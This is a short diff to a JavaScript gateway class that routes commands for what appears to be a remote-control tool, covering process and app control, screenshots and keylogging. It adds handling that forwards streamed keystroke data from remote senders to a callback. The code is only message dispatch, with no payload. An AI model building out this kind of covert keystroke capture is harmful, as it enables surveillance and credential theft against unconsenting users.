@@ -219,6 +219,8 @@ export class Gateway{
                 case CONFIG.CMD.PROC_KILL:
                 case CONFIG.CMD.APP_START:
                 case CONFIG.CMD.APP_KILL:
+                case CONFIG.CMD.START_KEYLOG:
+                case CONFIG.CMD.STOP_KEYLOG:
                     this._handleCommandResult(msg.type, msg.data);
                     break;
                 case CONFIG.CMD.SCREENSHOT:
@@ -237,9 +239,11 @@ export class Gateway{
                         }
                     }
                     break;
-                case CONFIG.CMD.START_KEYLOG:
-                    if (this.callbacks.onKeylog) {
-                        this.callbacks.onKeylog(msg.data, senderId);
+                case CONFIG.CMD.STREAM_DATA:
+                    if (msg.data && msg.data.data) {
+                        if (this.callbacks.onKeylog) {
+                            this.callbacks.onKeylog(msg.data.data, senderId);
+                        }
                     }
                     break;
                 case CONFIG.CMD.ERROR:
